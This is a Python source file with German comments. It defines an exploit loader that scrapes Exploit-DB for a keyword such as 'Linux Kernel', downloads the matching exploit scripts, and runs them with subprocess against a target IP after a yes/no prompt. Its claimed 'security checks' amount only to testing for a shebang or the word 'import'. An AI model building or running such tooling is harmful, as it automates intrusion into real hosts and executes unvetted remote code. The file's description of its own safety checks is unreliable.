import requests
import os
import hashlib
import subprocess
import logging
from bs4 import BeautifulSoup

LOG_FILE = "logs/exploit_loader.log"
EXPLOIT_DIR = "dependencies/exploits/"
EXPLOITDB_URL = "https://www.exploit-db.com"

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class ExploitLoader:
    """
    Sucht, validiert und f√ºhrt Exploits aus ‚Äì mit Sicherheitspr√ºfungen.
    """

    def __init__(self):
        if not os.path.exists(EXPLOIT_DIR):
            os.makedirs(EXPLOIT_DIR)

    def search_exploits(self, keyword):
        """
        Sucht nach aktuellen Exploits basierend auf einem Suchbegriff.
        """
        logging.info(f"üîç Suche nach Exploits f√ºr: {keyword}")

        try:
            response = requests.get(f"{EXPLOITDB_URL}/search?q={keyword}", timeout=10)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            logging.error(f"‚ùå Fehler beim Abrufen der Exploits: {e}")
            return []

        soup = BeautifulSoup(response.text, "html.parser")
        exploit_links = [EXPLOITDB_URL + link["href"] for link in soup.find_all("a", href=True) if "/exploits/" in link["href"]]

        return exploit_links[:5]

    def download_exploit(self, exploit_url):
        """
        L√§dt ein Exploit-Skript herunter und speichert es.
        """
        logging.info(f"‚¨áÔ∏è Lade Exploit herunter: {exploit_url}")
        try:
            response = requests.get(exploit_url, timeout=10)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            logging.error(f"‚ùå Fehler beim Herunterladen: {e}")
            return None

        if not response.text.startswith("#!") and "import" not in response.text:
            logging.error("‚ùå Verd√§chtige Datei ‚Äì kein g√ºltiger Exploit.")
            return None

        filename = exploit_url.split("/")[-1]
        file_path = os.path.join(EXPLOIT_DIR, filename)
        with open(file_path, "wb") as f:
            f.write(response.content)

        return file_path

    def run_exploit(self, file_path, target_ip):
        """
        Fordert manuelle Best√§tigung an, bevor der Exploit ausgef√ºhrt wird.
        """
        confirm = input(f"üö® Soll der Exploit {file_path} auf {target_ip} ausgef√ºhrt werden? (ja/nein): ")
        if confirm.lower() == "ja":
            subprocess.run(["python3", file_path, target_ip], check=True)
        else:
            print("‚ö†Ô∏è Exploit wurde nicht ausgef√ºhrt.")

if __name__ == "__main__":
    loader = ExploitLoader()
    target = "192.168.1.100"
    loader.search_exploits("Linux Kernel")
